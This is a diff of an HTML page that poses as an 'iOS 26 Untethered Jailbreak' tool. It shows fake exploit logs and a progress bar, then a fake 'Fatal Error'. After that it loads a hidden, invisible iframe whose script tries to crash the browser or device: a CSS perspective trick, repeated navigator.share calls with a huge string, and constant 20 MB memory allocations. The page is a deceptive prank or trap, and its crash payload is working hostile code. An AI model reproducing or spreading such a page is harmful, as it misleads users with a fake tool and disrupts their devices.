@@ -2,138 +2,213 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Recovery</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>iOS 26 Jailbreak</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&family=JetBrains+Mono&display=swap" rel="stylesheet">
     <style>
         body {
-            background: #000;
-            color: #00ff00; /* Классический цвет консоли */
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            font-family: 'Courier New', Courier, monospace;
+            background-color: #000;
+            color: #fff;
+            font-family: 'Inter', sans-serif;
             overflow: hidden;
-            text-align: left;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
         }
-
-        #ui-container {
-            width: 80%;
-            max-width: 400px;
+        .jailbreak-gradient {
+            background: radial-gradient(circle at center, #111 0%, #000 100%);
         }
-
-        #console {
-            height: 150px;
-            overflow: hidden;
-            font-size: 12px;
-            margin-bottom: 20px;
-            display: flex;
-            flex-direction: column-reverse;
+        .font-mono {
+            font-family: 'JetBrains Mono', monospace;
         }
-
-        .log-entry {
-            margin-bottom: 5px;
-            opacity: 0.8;
+        .console-container::-webkit-scrollbar {
+            width: 4px;
         }
-
-        #progress-container {
-            width: 100%;
-            height: 10px;
-            border: 1px solid #00ff00;
-            background: #000;
-            position: relative;
+        .console-container::-webkit-scrollbar-thumb {
+            background: #333;
+            border-radius: 2px;
         }
-
-        #progress-bar {
-            width: 0%;
-            height: 100%;
-            background: #00ff00;
-            transition: width 0.1s linear;
+        @keyframes scan {
+            0% { transform: translateY(-100%); }
+            100% { transform: translateY(100%); }
         }
-
-        #fatal-error {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            color: white;
-            font-size: 10px;
-            letter-spacing: 1px;
-        }
-
-        #respring-iframe {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 1px;
-            height: 1px;
-            border: none;
-            opacity: 0.01; 
-            pointer-events: none;
-        }
-
-        .footer {
-            position: absolute;
-            bottom: 10px;
-            font-size: 10px;
-            color: #444;
+        .scan-line {
+            height: 2px;
+            background: linear-gradient(to right, transparent, rgba(255,255,255,0.2), transparent);
+            animation: scan 3s linear infinite;
         }
     </style>
 </head>
-<body>
+<body class="jailbreak-gradient min-h-screen flex flex-col items-center justify-center p-6 bg-black">
 
-    <div id="ui-container">
-        <div id="console"></div>
-        <div id="progress-container">
-            <div id="progress-bar"></div>
+    <!-- WELCOME PHASE -->
+    <div id="welcome-screen" class="text-center space-y-8 max-w-md w-full">
+        <div class="flex justify-center">
+            <div class="w-24 h-24 rounded-[2rem] bg-white/5 backdrop-blur-xl border border-white/10 flex items-center justify-center shadow-2xl">
+                <i data-lucide="shield" class="w-12 h-12 text-white"></i>
+            </div>
         </div>
-        <p id="status-text" style="font-size: 14px; margin-top: 10px;">Initializing...</p>
+        
+        <div class="space-y-2">
+            <h1 class="text-4xl font-bold tracking-tight">iOS 26</h1>
+            <p class="text-white/60 text-lg">Untethered Jailbreak v1.0.4</p>
+        </div>
+
+        <button id="start-btn" class="group relative w-full py-4 px-8 bg-white text-black font-semibold rounded-2xl transition-all active:scale-95">
+            <span class="relative z-10 flex items-center justify-center gap-2">
+                <i data-lucide="download" class="w-5 h-5"></i>
+                Jailbreak Now
+            </span>
+        </button>
+
+        <p class="text-xs text-white/30">
+            Compatible with all A19 & A20 devices. Use at your own risk.
+        </p>
     </div>
 
-    <div id="fatal-error">Fatal Error</div>
+    <!-- RUNNING PHASE -->
+    <div id="running-screen" class="hidden w-full max-w-2xl space-y-8">
+        <div class="flex items-center justify-between px-2">
+            <div class="flex items-center gap-3">
+                <i data-lucide="loader-2" class="w-5 h-5 animate-spin text-white/60"></i>
+                <span class="font-mono text-sm tracking-widest uppercase text-white/60">Exploiting Kernel...</span>
+            </div>
+            <span id="progress-text" class="font-mono text-sm">0%</span>
+        </div>
 
-    <iframe id="respring-iframe" sandbox="allow-forms allow-modals allow-scripts allow-same-origin"></iframe>
+        <div class="relative h-2 w-full bg-white/5 rounded-full overflow-hidden border border-white/5">
+            <div id="progress-bar" class="absolute inset-y-0 left-0 bg-white shadow-[0_0_20px_rgba(255,255,255,0.4)] transition-all duration-100" style="width: 0%"></div>
+        </div>
+
+        <div id="console" class="console-container h-64 bg-white/5 backdrop-blur-md rounded-2xl border border-white/10 p-6 font-mono text-[10px] overflow-y-auto space-y-2">
+        </div>
+
+        <div class="grid grid-cols-2 gap-4">
+            <div class="bg-white/5 border border-white/10 rounded-xl p-4 flex items-center justify-between">
+                <div class="flex items-center gap-2 text-white/40">
+                    <i data-lucide="cpu" class="w-4 h-4"></i>
+                    <span class="text-[10px] uppercase tracking-wider">Chipset</span>
+                </div>
+                <span class="font-mono text-sm">A20X</span>
+            </div>
+            <div class="bg-white/5 border border-white/10 rounded-xl p-4 flex items-center justify-between">
+                <div class="flex items-center gap-2 text-white/40">
+                    <i data-lucide="zap" class="w-4 h-4"></i>
+                    <span class="text-[10px] uppercase tracking-wider">Power</span>
+                </div>
+                <span class="font-mono text-sm">Optimal</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- FINAL PHASE -->
+    <div id="final-screen" class="hidden flex flex-col items-center justify-center space-y-4">
+        <div id="fatal-error" class="hidden text-[8px] font-mono text-red-500 uppercase tracking-widest animate-pulse">
+            Fatal Error: exploit_loop_overflow at 0x00FF2A
+        </div>
+        <div class="flex flex-col items-center gap-2 opacity-20">
+            <i data-lucide="check-circle-2" class="w-8 h-8"></i>
+            <p class="text-[10px] font-mono italic">Finalizing stage 3...</p>
+        </div>
+    </div>
+
+    <!-- RESPRING OVERLAY -->
+    <div id="respring-overlay" class="hidden fixed inset-0 bg-black z-[9999] flex flex-col items-center justify-center space-y-6">
+        <div class="flex flex-col items-center gap-4 text-white/40 animate-pulse">
+            <i data-lucide="loader-2" class="w-12 h-12 animate-spin"></i>
+            <p class="text-sm font-mono tracking-widest uppercase">Respringing...</p>
+        </div>
+        <div class="fixed bottom-12 text-[10px] text-white/10 text-center font-mono uppercase space-y-1">
+            <p>© 2026 neonmodder123</p>
+            <p>Jailbreak Complete</p>
+        </div>
+    </div>
+
+    <iframe id="exploit-iframe" class="fixed top-0 left-0 w-1 h-1 opacity-0 pointer-events-none" sandbox="allow-forms allow-modals allow-scripts allow-same-origin"></iframe>
+
+    <div class="fixed bottom-8 left-0 right-0 text-center opacity-10 pointer-events-none lowercase font-mono text-[10px]">
+        p0sixninja x geohot x neon
+    </div>
 
     <script>
+        lucide.createIcons();
+
         const logs = [
-            "Connecting to kernel...",
-            "Checking filesystem...",
-            "Loading exploit: m_core_3...",
-            "Bypassing sandbox...",
-            "Escalating privileges...",
-            "Injecting payload...",
-            "Memory corruption initiated...",
-            "Clearing sys-logs...",
-            "Finalizing exploit..."
+            "Initializing iOS 26 kernel exploit...",
+            "Targeting A20 Bionic architecture...",
+            "Bypassing PPL (Page Protection Layer)...",
+            "Escalating privileges to root...",
+            "Downloading stage 2 payload...",
+            "Patching amfid binaries...",
+            "Injecting custom kexts...",
+            "Signing system images (0x992)...",
+            "Verifying integrity of jailbreak...",
+            "Finalizing installation..."
         ];
 
-        const consoleDiv = document.getElementById('console');
-        const progressBar = document.getElementById('progress-bar');
-        const statusText = document.getElementById('status-text');
-        const uiContainer = document.getElementById('ui-container');
-        const fatalError = document.getElementById('fatal-error');
-        const frame = document.getElementById('respring-iframe');
-
-        let progress = 0;
         let logIndex = 0;
+        let progress = 0;
+
+        document.getElementById('start-btn').addEventListener('click', () => {
+            document.getElementById('welcome-screen').classList.add('hidden');
+            document.getElementById('running-screen').classList.remove('hidden');
+            startProcess();
+        });
 
         function addLog() {
             if (logIndex < logs.length) {
-                const log = document.createElement('div');
-                log.className = 'log-entry';
-                log.innerText = `> ${logs[logIndex]}`;
-                consoleDiv.prepend(log);
+                const consoleDiv = document.getElementById('console');
+                const logEl = document.createElement('div');
+                logEl.className = 'flex gap-3 opacity-0 translate-x-[-10px] transition-all duration-300';
+                logEl.innerHTML = `
+                    <span class="text-white/30">[${new Date().toLocaleTimeString()}]</span>
+                    <span class="text-white/80">${logs[logIndex]}</span>
+                `;
+                consoleDiv.appendChild(logEl);
+                setTimeout(() => {
+                    logEl.classList.remove('opacity-0', 'translate-x-[-10px]');
+                }, 10);
                 logIndex++;
+                consoleDiv.scrollTop = consoleDiv.scrollHeight;
             }
         }
 
-        function startRespring() {
-            const respringScript = `
+        function startProcess() {
+            const interval = setInterval(() => {
+                progress += 0.5;
+                if (progress > 100) progress = 100;
+                
+                document.getElementById('progress-bar').style.width = progress + '%';
+                document.getElementById('progress-text').innerText = Math.floor(progress) + '%';
+
+                if (Math.random() > 0.93) addLog();
+
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(showError, 1000);
+                }
+            }, 30);
+        }
+
+        function showError() {
+            document.getElementById('running-screen').classList.add('hidden');
+            document.getElementById('final-screen').classList.remove('hidden');
+            
+            setTimeout(() => {
+                document.getElementById('fatal-error').classList.remove('hidden');
+                setTimeout(triggerRespring, 1500);
+            }, 500);
+        }
+
+        function triggerRespring() {
+            document.getElementById('final-screen').classList.add('hidden');
+            document.getElementById('respring-overlay').classList.remove('hidden');
+
+            const iframe = document.getElementById('exploit-iframe');
+            const exploit = `
                 <html>
-                <body style="margin:0; overflow:hidden;">
+                <body style="background: black;">
                     <script>
                         const container = document.createElement('div');
                         container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
@@ -144,9 +219,7 @@
                             container.appendChild(d);
                         }
                         setInterval(() => {
-                            try {
-                                navigator.share({ title: 'R', text: 'R'.repeat(100000) });
-                            } catch(e) {}
+                            try { navigator.share({ title: 'R', text: 'R'.repeat(100000) }); } catch(e) {}
                             let x = new Uint8Array(1024 * 1024 * 20);
                             crypto.getRandomValues(x);
                         }, 0);
@@ -154,30 +227,8 @@
                 </body>
                 </html>
             `;
-            frame.srcdoc = respringScript;
+            iframe.srcdoc = exploit;
         }
-
-        const interval = setInterval(() => {
-            progress += Math.random() * 2;
-            if (progress >= 100) {
-                progress = 100;
-                clearInterval(interval);
-                
-                // Финальный переход
-                uiContainer.style.display = 'none';
-                fatalError.style.display = 'block';
-                
-                // Запуск твоего кода респринга
-                setTimeout(startRespring, 500);
-            }
-            
-            progressBar.style.width = progress + '%';
-            statusText.innerText = `Processing: ${Math.floor(progress)}%`;
-            
-            if (Math.random() > 0.8) addLog();
-        }, 100);
-
     </script>
-    <div class="footer">© 2026 neonmodder123 | MIT License</div>
 </body>
 </html>
